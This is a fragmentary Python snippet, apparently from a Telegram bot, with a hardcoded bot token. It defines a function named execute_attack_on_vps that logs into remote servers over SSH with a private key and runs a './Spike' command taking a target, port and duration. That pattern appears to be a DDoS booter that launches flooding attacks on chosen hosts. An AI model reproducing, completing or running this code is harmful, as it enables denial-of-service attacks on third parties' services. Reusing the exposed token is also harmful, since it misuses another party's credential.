...
bot = telebot.TeleBot('7599785141:AAEKbXgjfv5qliNlfstwfjUeJOzzUAGp6Z8')
...
def execute_attack_on_vps(vps, target, port, time):
    ...
    try:
        ...
        key = paramiko.RSAKey.from_private_key_file(vps['pem_path'])
        ssh.connect(
            hostname=vps['host'],
        ...
        command = f"./Spike {target} {port} {time} 15 600"
